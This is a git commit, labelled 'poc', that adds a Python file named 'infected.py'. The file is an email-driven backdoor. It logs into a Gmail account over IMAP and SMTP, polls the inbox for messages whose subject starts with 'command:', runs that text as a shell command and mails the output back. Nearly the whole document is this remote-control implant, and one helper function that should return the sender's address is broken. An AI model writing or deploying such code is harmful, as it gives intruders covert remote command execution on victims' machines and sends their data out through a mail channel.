ad938feffc4ea66ef7ec15825bcb4eea38801d1a
binarioGH <lacuentafalsadediegojonas@gmail.com>
2019-07-19 16:24:24 -0700

    poc

---
+++ bloodymsj/infected.py
@@ -0,0 +1,79 @@
+#-*-coding: utf-8-*-
+from imaplib import IMAP4_SSL as imap
+from email import message_from_string as emailinfo
+from sys import argv
+from subprocess import run, PIPE 
+from time import strftime as date
+from threading import Thread
+from time import sleep
+from smtplib import SMTP
+from email.mime.text import MIMEText
+
+getDate = lambda: "{}-{}".format(date("%d %m %y"), date("%H:%M:%S"))
+
+class Mailer:
+	def __init__(self,user, passw, server="smtp.gmail.com:587"):
+		self.user = user
+		self.passw = passw
+		self.smtp = SMTP(server)
+		self.smtp.starttls()
+		self.smtp.login(self.user, self.passw)
+	def send(self,msj, to, sbj=getDate()):
+		mime_message = MIMEText(msj)
+		mime_message["From"] = self.user
+		mime_message["To"] = to
+		mime_message["Subject" ] = sbj 
+		self.smtp.send(self.user, to, mime_message.as_string())
+
+def getOutput(cmd):
+	resp = run(cmd, shell=True, stdout=PIPE, stderr=PIPE)
+	stdout = resp.stdout.decode("latin1")
+	stderr = resp.stderr.decode("latin1")
+	out = "{}{}".format(stdout,stderr)
+	return out
+
+def getFrom(f):
+	f = f.split()
+	f = f[-1][1:-1]
+
+def getCommands(conn, smtp):
+	lastmsj = ""
+	while True:
+		sleep(2)
+		try:
+			result, data = conn.uid("search", None, "HEADER Subject 'command:'") 
+		except Exception as e:
+			print(e)
+			continue
+		messajes = data[0].split()
+		if len(messajes) == 0:
+			continue
+		if messajes[-1] == lastmsj:
+			continue
+		else:
+			lastmsj = messajes[-1]
+		result, data = conn.uid("fetch", lastmsj, "(RFC822)")
+		raw = data[0][1].decode("utf-8")
+		mail = emailinfo(raw)
+		command = mail["Subject"][8:]
+		out = getOutput(command)
+		sendto = getFrom(mail["From"])
+		smtp.send(out, sendto, "{} {}".format(command, getDate()))
+
+
+def main():
+	user = argv[1]
+	passw = argv[2]
+	smtp = Mailer(user, passw)
+	conn = imap("imap.gmail.com")
+	conn.login(user, passw)
+	conn.select("INBOX")
+	getmsj = Thread(target=getCommands, args=[conn, smtp,])
+	getmsj.daemon = True
+	getmsj.start()
+	cmd = ""
+	while cmd != "exit":
+		cmd = input(">")
+	exit()
+if __name__ == '__main__':
+	main()
